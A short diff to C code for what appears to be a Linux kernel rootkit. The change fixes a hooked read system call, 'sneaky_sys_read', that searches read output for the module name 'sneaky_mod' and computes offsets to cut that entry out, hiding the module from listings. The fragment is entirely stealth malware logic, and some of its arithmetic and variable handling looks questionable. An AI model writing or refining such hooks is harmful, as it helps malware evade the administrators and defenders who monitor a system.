@@ -132,7 +132,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
     char *module_name = "sneaky_mod";
     char *module_ptr = strstr(buf, module_name);
     if (module_ptr) {
-      char *curr = strstr(buf, "\n");
+      char *curr = strstr(module_ptr, "\n");
       ssize_t sz_diff = (size_t)(curr - (char *)buf);
       ssize_t count = byte_read - sz_diff;
       ssize_t sneaky_module_sz = (size_t)(curr - module_ptr);
